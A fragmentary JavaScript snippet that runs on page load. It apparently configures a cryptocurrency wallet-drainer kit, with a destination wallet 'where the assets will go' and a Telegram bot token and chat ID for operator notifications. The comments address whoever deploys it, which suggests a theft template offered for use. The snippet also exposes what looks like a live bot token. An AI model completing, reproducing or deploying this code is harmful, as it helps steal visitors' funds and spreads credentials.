...
document.addEventListener("DOMContentLoaded", async () => {
    ...
    const CF = {
        Wallet: "UQDtKMIQ2ZEZ5IjZzekThMGjdfXHLGxVwWKn1Yw-dPDHKrVn",  // Wallet address where the assets will go
    ...
    const TG = {
        token: "7716004433:AAERDOspW1qY7h2NH8_YbF617hfjfPm5v_4", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
        chat_id: "-1003287326442", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
